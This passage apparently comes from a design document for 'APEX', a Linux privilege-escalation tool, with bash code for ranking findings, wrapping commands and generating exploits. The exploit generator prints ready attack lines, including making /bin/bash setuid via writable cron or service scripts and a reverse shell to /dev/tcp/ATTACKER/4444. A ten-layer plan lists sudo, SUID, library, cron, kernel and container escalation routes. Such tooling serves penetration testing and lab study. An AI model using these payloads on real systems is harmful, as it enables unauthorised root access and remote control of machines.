            [[ -w "$workdir" ]] && {
                echo "[WORKDIR_WRITABLE] $unit WorkingDirectory: $workdir is writable"
                echo "  Can place malicious libraries or scripts here"
                register_finding "WORKDIR_WRITE" "$workdir" "$unit" 70
            }
        done
    
    # User= (what user runs this service)
    local run_as=$(echo "$unit_content" | grep "^User=" | cut -d= -f2)
    [[ -n "$run_as" ]] && echo "[UNIT_USER] $unit runs as: ${run_as:-root}"
}
```

---

## 5. Engine 3 — The Reasoner

Takes all data from Engines 1 and 2. Builds confirmed chains. Ranks output.

### 5.1 Chain Confirmation

```bash
# Global findings registry
declare -A FINDINGS  # key=id, value="type|path|chain|confidence"
FINDING_COUNT=0

register_finding() {
    local type="$1"
    local path="$2"
    local chain="$3"
    local base_confidence="$4"
    
    # Multi-lens bonus: if same path confirmed by multiple methods, increase confidence
    local existing_key="path_${path//\//_}"
    if [[ -n "${FINDINGS[$existing_key]}" ]]; then
        # Already found by another method — increase confidence
        base_confidence=$((base_confidence + 15))
        base_confidence=$((base_confidence > 99 ? 99 : base_confidence))
        echo "[MULTI-LENS CONFIRMED] $path — confidence boosted to ${base_confidence}%"
    fi
    
    FINDINGS["finding_$FINDING_COUNT"]="$type|$path|$chain|$base_confidence"
    FINDINGS["$existing_key"]="1"
    FINDING_COUNT=$((FINDING_COUNT + 1))
}

build_confirmed_chains() {
    # Sort all findings by confidence
    local sorted_findings=()
    for key in "${!FINDINGS[@]}"; do
        [[ "$key" == finding_* ]] && sorted_findings+=("${FINDINGS[$key]}")
    done
    
    # Sort by confidence field (field 4)
    printf '%s\n' "${sorted_findings[@]}" | sort -t'|' -k4 -nr
}
```

### 5.2 Exploit Command Generation

```bash
generate_exploit_command() {
    local type="$1"
    local path="$2"
    local chain="$3"
    
    # Select exploit method based on available execution primitives
    local exec_method="${EXEC_PRIMITIVES[0]}"
    
    case "$type" in
        SUDO_NOPASSWD)
            local binary="$path"
            generate_sudo_exploit "$binary"
            ;;
        SUID_GTFOBINS)
            generate_suid_exploit "$path"
            ;;
        WRITE_IN_CHAIN|SOURCE_INJECT|CONFIG_INJECT)
            echo "echo 'chmod +s /bin/bash' >> \"$path\" && sleep 61 && /bin/bash -p"
            echo "# OR for immediate shell:"
            echo "echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> \"$path\""
            ;;
        ENVFILE_INJECT)
            generate_envfile_exploit "$path"
            ;;
        LIB_HIJACK)
            generate_library_exploit "$path"
            ;;
        CRON_PATH_HIJACK)
            generate_cron_path_exploit "$path"
            ;;
    esac
}
```

---

## 6. The Ten Adaptive Layers

When a layer finds nothing, the next layer activates automatically.
APEX never stops. Never says clean. Always tells you exactly what to try next.

```
LAYER 1: DAC Graph (execution ∩ write map)         [covers ~75% of machines]
LAYER 2: Deep Reader (chain following)              [covers additional 10%]
LAYER 3: Credential Hunt (read → auth → escalate)  [covers additional 5%]
LAYER 4: Package Integrity (injected binaries)      [catches maker tricks]
LAYER 5: Timeline Analysis (find -newer /proc/1/exe)[catches custom additions]
LAYER 6: pspy Dynamic (3-min monitoring)            [catches intermittent crons]
LAYER 7: Kernel CVE Assessment (uname + database)   [covers kernel privesc]
LAYER 8: Container Escape (if container detected)   [covers container breaks]
LAYER 9: MAC Policy Analysis (AppArmor/SELinux)     [explains blocked paths]
LAYER 10: Manual Direction (application logic)      [ports + services to check]

Transition message between layers:
"[APEX] Layer N exhausted. No confirmed paths found via [method].
 Activating Layer N+1: [method]. Running..."
```

---

## 7. Robustness Wrapper (Applied To Every Single Command)

```bash
safe_run() {
    local cmd="$1"
    local timeout_sec="${2:-10}"
    local result
    
    # The three-layer protection:
    # 1. stdin from /dev/null → kills ALL password prompts immediately
    # 2. timeout → kills if hanging after N seconds
    # 3. Capture in subshell → failure isolated, parent continues
    
    case "$TIMEOUT_CMD" in
        timeout)
            result=$(timeout "$timeout_sec" bash -c "$cmd" </dev/null 2>/dev/null)
            ;;
        "busybox timeout")
            result=$(busybox timeout "$timeout_sec" bash -c "$cmd" </dev/null 2>/dev/null)
            ;;
        none)
            # No timeout binary — background + watchdog kill
            result=$(
                bash -c "$cmd" </dev/null 2>/dev/null &
                local bg_pid=$!
                ( sleep "$timeout_sec"; kill $bg_pid 2>/dev/null ) &
                local killer=$!
                wait $bg_pid 2>/dev/null
                kill $killer 2>/dev/null
            )
            ;;
    esac
    
    local exit_code=$?
    
    # Log failures for debugging (not shown to user)
    if [[ $exit_code -eq 124 ]]; then
        echo "APEX_TIMEOUT: $cmd" >> "$APEX_TMP/debug.log" 2>/dev/null
    elif [[ $exit_code -ne 0 ]]; then
        echo "APEX_FAILED($exit_code): $cmd" >> "$APEX_TMP/debug.log" 2>/dev/null
    fi
    
    # ALWAYS output result (may be empty — that's fine)
    echo "$result"
    
    # ALWAYS return 0 — parent script never sees failure
    return 0
}
```
